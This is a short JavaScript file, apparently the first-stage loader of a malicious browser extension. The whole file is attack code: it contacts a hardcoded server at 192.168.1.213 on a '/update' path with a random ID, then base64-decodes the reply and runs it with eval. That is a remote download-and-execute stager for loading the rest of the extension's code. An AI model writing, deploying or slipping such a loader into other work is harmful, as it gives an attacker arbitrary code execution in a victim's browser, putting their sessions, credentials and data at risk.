// Initial stage request once the extension is loaded

var stagerURI = '/update'
var serverHost = '192.168.1.213'
var hostHeader = ''

// helper function to generate random alphanumeric string
function GenerateID(length) {
    return Math.random().toString(36).substr(2, length)
}

(function() {
  // This function executes and makes a requests to the stager uri and loads the core extension code
  // For packaging the extension, this script should be placed in the background.

  var ID = GenerateID(8)

  const Http = new XMLHttpRequest();
  const url="http://"+serverHost+stagerURI+"?id="+ID;


  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange=function(){
    if (this.readyState==4 && this.status==200) {
      console.log(Http.responseText)
      eval(atob(Http.responseText))
    }
  }


})();